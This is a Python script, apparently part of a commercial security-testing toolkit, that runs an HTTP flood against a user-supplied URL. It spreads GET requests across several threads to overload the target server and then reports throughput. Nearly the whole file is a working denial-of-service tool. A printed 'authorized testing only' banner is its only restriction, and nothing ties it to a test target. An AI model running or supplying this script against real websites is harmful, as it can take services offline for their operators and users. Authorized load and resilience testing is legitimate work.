#!/usr/bin/env python3
"""
HTTP Flood Attack Simulation

Sends numerous HTTP requests to overwhelm a web server's resources.

Author: Montimage
License: Proprietary
Version: 1.0.0
"""

import os, sys, time, argparse, threading
from typing import Dict, Any
from urllib.parse import urlparse

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
try:
    from logger import get_logger
except ImportError:
    import logging
    def get_logger(name):
        logger = logging.getLogger(name)
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

logger = get_logger(__name__)

try:
    import requests
except ImportError:
    logger.error("Requires requests: pip install requests")
    sys.exit(1)


class HTTPFloodAttack:
    """HTTP Flood attack simulator."""

    def __init__(self, url: str, count: int = 100, threads: int = 10, verbose: bool = False):
        self.url = url
        self.count = max(1, count)
        self.threads = max(1, threads)
        self.verbose = verbose
        self.requests_sent = 0
        self.lock = threading.Lock()
        logger.info(f"Initialized HTTP flood attack on {url}")

    def send_request(self):
        """Send a single HTTP request."""
        try:
            response = requests.get(self.url, timeout=5)
            with self.lock:
                self.requests_sent += 1
            if self.verbose:
                logger.debug(f"Response: {response.status_code}")
        except Exception as e:
            if self.verbose:
                logger.debug(f"Request failed: {e}")

    def worker(self, requests_per_thread: int):
        """Worker thread."""
        for _ in range(requests_per_thread):
            self.send_request()

    def execute(self) -> Dict[str, Any]:
        """Execute the HTTP flood attack."""
        logger.info(f"Starting HTTP flood: {self.count} requests with {self.threads} threads")
        start_time = time.time()

        requests_per_thread = self.count // self.threads
        threads = []

        try:
            for _ in range(self.threads):
                t = threading.Thread(target=self.worker, args=(requests_per_thread,))
                t.start()
                threads.append(t)

            for t in threads:
                t.join()

            logger.info("HTTP flood completed")
        except KeyboardInterrupt:
            logger.warning("Interrupted")
        except Exception as e:
            logger.error(f"Error: {e}")
        finally:
            duration = time.time() - start_time
            stats = {
                "requests_sent": self.requests_sent,
                "duration_seconds": duration,
                "requests_per_second": self.requests_sent / duration if duration > 0 else 0
            }
            logger.info(f"Sent {stats['requests_sent']} requests in {stats['duration_seconds']:.2f}s")
            return stats


def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="HTTP Flood Attack Simulation")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-c", "--count", type=int, default=100, help="Number of requests")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    return parser.parse_args()


def main():
    print("=" * 80)
    print("WARNING: For AUTHORIZED SECURITY TESTING ONLY")
    print("=" * 80)
    try:
        args = parse_arguments()
        attack = HTTPFloodAttack(args.url, args.count, args.threads, args.verbose)
        attack.execute()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        logger.error(f"Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
